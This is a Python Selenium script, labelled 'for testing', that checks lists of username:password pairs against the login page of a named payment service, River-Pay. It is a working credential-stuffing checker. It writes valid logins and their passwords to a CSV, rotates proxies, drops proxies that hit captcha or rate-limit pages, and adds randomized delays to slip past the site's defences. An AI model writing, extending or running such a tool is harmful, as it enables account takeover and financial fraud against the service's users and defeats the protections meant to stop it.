#!/usr/bin/env python3
"""
Simple Selenium-based login checker for River-Pay (for testing)
Reads an input text file with lines in `user:pass` format and attempts login to the provided URL.
Saves results to a CSV file with columns: username,password,status,message

Defaults (can be overridden with CLI args):
 - URL: https://river-pay.com/office/login
 - user xpath: //*[@id="LoginForm_login"]
 - pass xpath: //*[@id="LoginForm_password"]

Detection heuristic:
 - If the page URL changes after submit -> success
 - If xpath elements for login still present -> failure
 - Otherwise assume success if login form no longer present

Note: This script uses Selenium and requires Chrome/Chromium and matching chromedriver to be installed.
"""

import argparse
import csv
import json
import os
import random
import time
from pathlib import Path
import sys

from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException, WebDriverException
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
try:
    # webdriver-manager is optional; only import if available
    from webdriver_manager.chrome import ChromeDriverManager
    WEBDRIVER_MANAGER_AVAILABLE = True
except Exception:
    WEBDRIVER_MANAGER_AVAILABLE = False


def attempt_login(driver, url, user_selector, pass_selector, logout_selectors, username, password, wait_after=3):
    try:
        driver.get(url)
    except WebDriverException as e:
        return False, f"navigation error: {e}"

    time.sleep(1)
    try:
        u_el = driver.find_element(By.CSS_SELECTOR, user_selector)
        p_el = driver.find_element(By.CSS_SELECTOR, pass_selector)
    except NoSuchElementException as e:
        return False, f"login fields not found: {e}"

    try:
        u_el.clear()
        u_el.send_keys(username)
        p_el.clear()
        p_el.send_keys(password)
        # Submit by pressing ENTER on password field
        p_el.send_keys(Keys.ENTER)
    except Exception as e:
        return False, f"input/sendkeys error: {e}"

    # wait/poll for response (short polling loop so we can detect dynamic changes)
    start = time.time()
    end = start + max(0.5, wait_after)
    initial_url = driver.current_url

    while time.time() < end:
        time.sleep(0.25)

        # 1) URL changed -> likely success (may redirect to dashboard)
        try:
            current_url = driver.current_url
            if current_url and (current_url.rstrip('/') != url.rstrip('/')) and (current_url.rstrip('/') != initial_url.rstrip('/')):
                return True, f"URL changed -> {current_url}"
        except Exception:
            pass

        # 2) Check for explicit logout href (common and reliable)
        try:
            logout_links = driver.find_elements(By.XPATH, "//a[contains(@href, '/office/logout')]")
            if logout_links:
                return True, "logout link (/office/logout) present"
        except Exception:
            pass

        # 3) Check for textual cue like 'You logged in as' used in header dropdown
        try:
            cues = driver.find_elements(By.XPATH, "//*[contains(normalize-space(.), 'You logged in as')]")
            if cues:
                return True, "header 'You logged in as' present"
        except Exception:
            pass

        # 4) Check for any of the provided logout/dashboard selectors
        for sel in (logout_selectors or []):
            try:
                if sel and driver.find_elements(By.CSS_SELECTOR, sel):
                    return True, f"logout/dashboard selector present: {sel}"
            except Exception:
                # ignore malformed selector or errors
                pass

    # After polling, if login form fields still present -> failure, else success
    try:
        driver.find_element(By.CSS_SELECTOR, user_selector)
        # still present
        return False, "login form still present after submit"
    except NoSuchElementException:
        # form not found -> likely logged in or page changed dynamic
        return True, "login form gone after submit"


def load_proxies(path: str):
    """Load proxies from a file. Supports JSON (list) or plain text (one per line).

    Returns a list of proxy strings in the form host:port
    """
    p = Path(path)
    if not p.exists():
        raise FileNotFoundError(path)
    text = p.read_text(encoding="utf-8", errors="ignore").strip()
    if not text:
        return []
    if p.suffix.lower() == '.json':
        try:
            data = json.loads(text)
            if isinstance(data, list):
                return [str(x).strip() for x in data if x]
        except Exception:
            # fall through and try parsing as lines
            pass
    # parse as plain text lines
    lines = [l.strip() for l in text.splitlines() if l.strip()]
    return lines


def is_blocked_or_rate_limited(page_source: str, last_exception: Exception | None = None) -> bool:
    """Heuristic checks to determine if the current page/exception indicates a proxy block or rate limit."""
    ps = (page_source or "").lower()
    checks = [
        'too many requests',
        'rate limit',
        'access denied',
        'forbidden',
        'captcha',
        'unusual traffic',
        'request blocked',
        'error 429',
        'error 403',
    ]
    for c in checks:
        if c in ps:
            return True
    if last_exception:
        msg = str(last_exception).lower()
        if 'proxy' in msg or 'tunnel' in msg or 'connect' in msg or 'connection refused' in msg:
            return True
    return False


def make_driver(headless=True, window_size=(1200, 900), auto_install=False, proxy: str | None = None):
    chrome_options = Options()
    if headless:
        chrome_options.add_argument("--headless=new")
    chrome_options.add_argument(f"--window-size={window_size[0]},{window_size[1]}")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    # optional: disable images to speed up
    prefs = {"profile.managed_default_content_settings.images": 2}
    chrome_options.add_experimental_option("prefs", prefs)
    if proxy:
        # proxy should be like host:port or scheme://host:port
        chrome_options.add_argument(f"--proxy-server={proxy}")

    if auto_install:
        if not WEBDRIVER_MANAGER_AVAILABLE:
            raise RuntimeError("webdriver-manager not available; install webdriver-manager or remove --auto-driver")
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=chrome_options)
    else:
        driver = webdriver.Chrome(options=chrome_options)
    return driver


def parse_input_file(path):
    pairs = []
    with open(path, "r", encoding="utf-8", errors="ignore") as fh:
        for raw in fh:
            line = raw.strip()
            if not line or line.startswith("#"):
                continue
            if ":" not in line:
                continue
            user, pwd = line.split(":", 1)
            user = user.strip()
            pwd = pwd.strip()
            if not user:
                continue
            pairs.append((user, pwd))
    return pairs


def main():
    parser = argparse.ArgumentParser(description="Check logins against River-Pay login page using Selenium.")
    parser.add_argument("--input", "-i", default="/workspaces/River-PayCheckr/river-pay(1).txt", help="Input file (user:pass per line)")
    parser.add_argument("--output", "-o", default="/workspaces/River-PayCheckr/login_results.csv", help="CSV output file")
    parser.add_argument("--url", default="https://river-pay.com/office/login", help="Login page URL")
    parser.add_argument("--user-selector", default='#LoginForm_login', help="CSS selector for user field")
    parser.add_argument("--pass-selector", default='#LoginForm_password', help="CSS selector for password field")
    parser.add_argument("--logout-selector", dest='logout_selectors', action='append', help="CSS selector that indicates a logged-in state (can be repeated)")
    parser.add_argument("--headless", action="store_true", help="Run browser in headless mode")
    parser.add_argument("--wait", type=float, default=3.0, help="Seconds to wait after submit before checking")
    parser.add_argument("--screenshots", action="store_true", help="Save screenshots for failures into ./screenshots/")
    parser.add_argument("--auto-driver", action="store_true", help="Auto-install chromedriver via webdriver-manager")
    parser.add_argument("--stream-simple", action="store_true", help="Print concise live output in the form 'username:SUCCESS' or 'username:FAIL'")
    parser.add_argument("--color", choices=["auto", "on", "off"], default="auto", help="Colorize stream output: auto=use tty, on=force, off=disable")
    parser.add_argument("--proxies", help="Path to proxies file (plain text one-per-line or JSON list)")
    parser.add_argument("--proxy-randomize", action="store_true", help="Randomize proxy list before use")
    parser.add_argument("--max-proxy-retries", type=int, default=3, help="Max proxy retries per credential before giving up")
    parser.add_argument("--save-html", action="store_true", help="Save page HTML for failures into ./snapshots_html/")
    parser.add_argument("--backoff-min", type=float, default=0.5, help="Minimum backoff sleep (seconds) between attempts")
    parser.add_argument("--backoff-max", type=float, default=1.5, help="Maximum backoff sleep (seconds) between attempts")

    args = parser.parse_args()

    inp = Path(args.input)
    if not inp.exists():
        print(f"Input file not found: {inp}")
        return

    pairs = parse_input_file(inp)
    print(f"Loaded {len(pairs)} username/password pairs from {inp}")

    output_path = Path(args.output)
    output_path.parent.mkdir(parents=True, exist_ok=True)

    screenshots_dir = Path.cwd() / "screenshots"
    if args.screenshots:
        screenshots_dir.mkdir(parents=True, exist_ok=True)
    snapshots_html_dir = Path.cwd() / "snapshots_html"
    if args.save_html:
        snapshots_html_dir.mkdir(parents=True, exist_ok=True)

    def save_page_html(driver_obj, username_label: str):
        try:
            html = ''
            try:
                html = driver_obj.page_source
            except Exception:
                html = ''
            if not html:
                return False
            safe_name = username_label.replace('/', '_').replace('\\', '_')
            fn = snapshots_html_dir / f"{safe_name}.html"
            with open(fn, 'w', encoding='utf-8', errors='ignore') as fh:
                fh.write(html)
            return True
        except Exception:
            return False

    # Load proxies if provided
    proxies = []
    if args.proxies:
        try:
            proxies = load_proxies(args.proxies)
            if args.proxy_randomize:
                random.shuffle(proxies)
        except Exception as e:
            print(f"Failed to load proxies from {args.proxies}: {e}")
            return

    driver = None
    # If no proxies supplied, create a single persistent driver to reuse
    if not proxies:
        try:
            driver = make_driver(headless=args.headless, auto_install=args.auto_driver)
        except Exception as e:
            print(f"Failed to start Chrome webdriver: {e}")
            return

    with open(output_path, "w", newline='', encoding="utf-8") as csvfile:
        writer = csv.writer(csvfile)
        writer.writerow(["username", "password", "status", "message"])

        # prepare logout selectors
        logout_selectors = args.logout_selectors or [
            ".nav-list > li:nth-child(14) > a:nth-child(1)",
            ".dropdown-menu > li:nth-child(2) > a:nth-child(1)",
        ]

        # proxy rotation state
        proxy_index = 0
        bad_proxies = set()

        for (username, password) in pairs:
            if not args.stream_simple:
                print(f"Attempting: {username}")

            attempt_msg = None
            attempt_ok = False

            # If proxies provided, try up to max_proxy_retries different proxies
            if proxies:
                retries = 0
                tried_proxies = []
                while retries < args.max_proxy_retries and len(tried_proxies) < max(1, len(proxies)):
                    # pick next non-bad proxy
                    if not proxies:
                        break
                    proxy = proxies[proxy_index % len(proxies)]
                    proxy_index += 1
                    if proxy in bad_proxies:
                        # skip bad proxies
                        tried_proxies.append(proxy)
                        continue

                    # create a fresh driver with this proxy
                    try:
                        d = make_driver(headless=args.headless, auto_install=args.auto_driver, proxy=proxy)
                    except Exception as e:
                        # driver failed to start with this proxy: mark as bad and continue
                        bad_proxies.add(proxy)
                        tried_proxies.append(proxy)
                        retries += 1
                        continue

                    try:
                        ok, msg = attempt_login(d, args.url, args.user_selector, args.pass_selector, logout_selectors, username, password, wait_after=args.wait)
                        page_src = ''
                        try:
                            page_src = d.page_source
                        except Exception:
                            pass
                        # if heuristics think this proxy/page is blocked, mark proxy bad and retry
                        if is_blocked_or_rate_limited(page_src, None):
                            # save HTML snapshot for debugging before marking proxy bad
                            try:
                                if args.save_html:
                                    save_page_html(d, username)
                            except Exception:
                                pass
                            bad_proxies.add(proxy)
                            tried_proxies.append(proxy)
                            retries += 1
                            try:
                                d.quit()
                            except Exception:
                                pass
                            continue

                        # otherwise accept result
                        attempt_ok = ok
                        attempt_msg = msg
                        # if the attempt failed (ok False) save HTML for debugging
                        try:
                            if (not ok) and args.save_html:
                                save_page_html(d, username)
                        except Exception:
                            pass
                        try:
                            d.quit()
                        except Exception:
                            pass
                        break
                    except WebDriverException as e:
                        # network/proxy related exception: mark proxy bad and retry
                        bad_proxies.add(proxy)
                        tried_proxies.append(proxy)
                        retries += 1
                        try:
                            d.quit()
                        except Exception:
                            pass
                        continue
                # end while proxies
                if attempt_msg is None:
                    attempt_ok = False
                    attempt_msg = f"all proxies failed or blocked after {retries} retries"
            else:
                # no proxies: reuse the single driver
                try:
                    ok, msg = attempt_login(driver, args.url, args.user_selector, args.pass_selector, logout_selectors, username, password, wait_after=args.wait)
                    attempt_ok = ok
                    attempt_msg = msg
                except Exception as e:
                    attempt_ok = False
                    attempt_msg = f"exception during attempt: {e}"
                    # save HTML snapshot for persistent-driver failures
                    try:
                        if args.save_html:
                            save_page_html(driver, username)
                    except Exception:
                        pass

            status = "SUCCESS" if attempt_ok else "FAIL"
            writer.writerow([username, password, status, attempt_msg])
            csvfile.flush()

            # concise streaming output for live monitoring (include short reason)
            if args.stream_simple:
                try:
                    _msg = (attempt_msg or "")
                    # take only the first line and truncate to 200 chars
                    _first = _msg.splitlines()[0] if _msg else ""
                    if len(_first) > 200:
                        _first = _first[:197] + "..."

                    # decide on color
                    color_enabled = False
                    try:
                        if args.color == 'on':
                            color_enabled = True
                        elif args.color == 'off':
                            color_enabled = False
                        else:
                            color_enabled = sys.stdout.isatty()
                    except Exception:
                        color_enabled = False

                    # Print concise form: SUCCESS has no reason, FAIL shows reason
                    if status == 'SUCCESS':
                        if color_enabled:
                            # bold red for SUCCESS if requested (user requested red)
                            print(f"{username}:")
                            print("\x1b[1;31mSUCCESS\x1b[0m")
                        else:
                            print(f"{username}:SUCCESS")
                    else:
                        # FAIL: include reason on same line
                        if color_enabled:
                            # keep reason uncolored to stay readable
                            print(f"{username}:FAIL:{_first}")
                        else:
                            print(f"{username}:FAIL:{_first}")
                except Exception:
                    # printing should never break the main loop
                    pass

            if (not attempt_ok) and args.screenshots:
                safe_name = username.replace('/', '_').replace('\\', '_')
                fn = screenshots_dir / f"{safe_name}.png"
                try:
                    # If we have an active driver, try to capture; otherwise skip
                    if proxies:
                        # no persistent driver; can't guarantee page is present
                        try:
                            if 'd' in locals() and d is not None:
                                d.save_screenshot(str(fn))
                        except Exception:
                            pass
                    else:
                        driver.save_screenshot(str(fn))
                except Exception:
                    pass

            # save page HTML for failures when requested
            if (not attempt_ok) and args.save_html:
                try:
                    if proxies:
                        try:
                            if 'd' in locals() and d is not None:
                                save_page_html(d, username)
                        except Exception:
                            pass
                    else:
                        try:
                            save_page_html(driver, username)
                        except Exception:
                            pass
                except Exception:
                    pass

            # randomized backoff between attempts to reduce chance of rate-limiting
            try:
                min_b = max(0.0, float(args.backoff_min))
                max_b = max(min_b, float(args.backoff_max))
                if max_b > 0:
                    sleeptime = random.uniform(min_b, max_b)
                    time.sleep(sleeptime)
            except Exception:
                # ignore backoff errors and continue
                pass

    print(f"Results saved to {output_path}")

    try:
        driver.quit()
    except Exception:
        pass


if __name__ == '__main__':
    main()
